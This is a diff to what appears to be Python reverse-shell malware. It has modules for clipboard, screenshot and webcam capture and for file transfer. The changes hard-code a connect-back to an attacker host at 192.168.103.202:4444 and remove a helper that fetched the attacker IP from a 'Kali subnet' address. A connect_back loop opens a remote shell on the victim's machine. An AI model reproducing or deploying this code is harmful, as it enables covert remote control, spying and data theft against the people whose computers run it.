@@ -1,3 +1,4 @@
+
 import socket
 import platform
 import subprocess
@@ -11,17 +12,6 @@ from clipboard import get_clipboard
 from screenshot import capture_screenshot
 from webcam import capture_webcam
 from util import send_file, receive_file
-
-def get_attacker_ip():
-    try:
-        s = socket.socket()
-        s.connect(("192.168.1.100", 5555))  # Replace with your Kali subnet
-        ip = s.recv(1024).decode()
-        s.close()
-        return ip
-    except:
-        return "127.0.0.1"
-
 
 def reliable_send(s, data):
     json_data = json.dumps(data)
@@ -80,11 +70,14 @@ def shell(s):
 def connect_back():
     while True:
         try:
+            print("[DEBUG] Attempting to connect to 192.168.103.202:4444")
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((get_attacker_ip(), 4444))
+            s.connect(("192.168.103.202", 4444))
+            print("[DEBUG] Connected successfully.")
             shell(s)
             break
-        except:
+        except Exception as e:
+            print(f"[DEBUG] Connection failed: {e}")
             time.sleep(5)
 
 if __name__ == "__main__":
